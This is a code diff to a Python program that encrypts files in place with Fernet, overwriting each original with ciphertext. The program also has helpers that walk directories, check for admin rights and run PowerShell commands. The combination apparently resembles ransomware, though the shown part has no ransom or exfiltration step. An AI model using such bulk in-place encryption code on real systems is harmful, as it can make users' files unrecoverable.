@@ -6,44 +6,73 @@ import string
 import subprocess
 import sys
 from cryptography.fernet import Fernet
+import tempfile
+from typing import IO
+
+
+def read_files(file_path: str) -> bytes:
+    file :bytes
+    with open(file_path,'rb') as data:
+        file = data.read()
+        data.close()
+    return file
+
+
+def create_temp_file_with_data(data:bytes) -> tempfile.NamedTemporaryFile:
+    t = tempfile.NamedTemporaryFile(mode='w+b', delete=False)
+    t.write(data)
+    t.seek(0)  # Reset the file pointer to the beginning
+    return t
+
+
+
+def encrypt_temp_file(tempo: IO[bytes], f_key: Fernet) -> bytes:
+    tempo.seek(0)  # Make sure we read the tempfile from the beginning
+    data = tempo.read()  # Read data from the tempfile
+    encrypted_data = f_key.encrypt(data)  # Encrypt the data with the Fernet key
+    return encrypted_data
+
+
+def save_temp_file(path_to_save: str, tempo: bytes) -> None:
+    with open(path_to_save,'wb') as file:
+        file.write(tempo)
+        file.close()
 
 
 def encrypt_file(file_path: str, f_key: Fernet) -> None:
-    try_count = 0
+    can_be_open: bool = False
     data: bytes
-    can_open: bool = False
-    # READ FILE
+    tempo: tempfile.NamedTemporaryFile
     try:
-        with open(file_path, 'rb') as ef:
-            data = ef.read()
-            # ENCRYPT
-            data = f_key.encrypt(data)
-            can_open = True
-    except Exception as e:
-        print(e)
-        pass
-    if can_open:
-        while os.path.isfile(file_path) and try_count <= 5:
-            try:
-                try:
-                    # DELETE
-                    os.remove(file_path)
-                except Exception as error:
-                    print(f'{error}')
-                # REWRITE FILE
-                try:
-                    with open(file_path, 'wb') as ef:
-                        print("rewrite", file_path)
-                        ef.write(data)
-                        break
-                except Exception as error:
-                    print(f'{error}')
-                    try_count = try_count + 1
+        data = read_files(file_path)
+        can_be_open = True
+    except PermissionError as error:
+        print(error)
+    if can_be_open:
+        try:
+            tempo = create_temp_file_with_data(data)
+        except Exception as error:
+            print(error)
+        try:
+            data = encrypt_temp_file(tempo,f_key)
+        except Exception as error:
+            print(error)
+        try:
+            save_temp_file(file_path, data)
+            tempo.close()
+        except Exception as error:
+            print(error)
 
-            finally:
-                try_count += 1
+    return None
 
 
+
+
+
+
+
+
+# ALL DIRECTORY RELATED FUNCTIONS
 def find_directory_from_file(name_of_file: [str], is_compress: bool, path: str, name_of_zip: str) -> [str]:
     """
     will find all the information inside a folder where the data have been save. if it is compres it
@@ -66,23 +95,6 @@ def find_directory_from_file(name_of_file: [str], is_compress: bool, path: str, 
         except PermissionError as error:
             print(error)
     return files
-
-
-# allow the program to call and receive powershell cmd
-def powershell(cmd) -> subprocess:
-    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
-    return completed
-
-
-def is_admin() -> bool:
-    """
-    :return: if the program is admin
-    """
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except Exception as e:
-        print(e)
-        return False
 
 
 def all_files(start_path: str) -> [str]:
@@ -120,7 +132,7 @@ def save_specific_files(path: str, files: [str]) -> None:
     :param files: Data that will go in that file
     :return:
     """
-    with open(path, 'w') as save:
+    with open(path, 'w', encoding="utf-8") as save:
         for e in files:
             save.write(f'{e}\n')
     save.close()
@@ -176,6 +188,24 @@ def find_all_file_from_directory(data_path: str, name_of_directory: str) -> [str
     return reg
 
 
+# CMD/POWERSHELL related
+def powershell(cmd) -> subprocess:
+    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+    return completed
+
+
+def is_admin() -> bool:
+    """
+    :return: if the program is admin
+    """
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except Exception as e:
+        print(e)
+        return False
+
+
+# RUN
 def main():
     # Look if program is admin
     files: [] = []
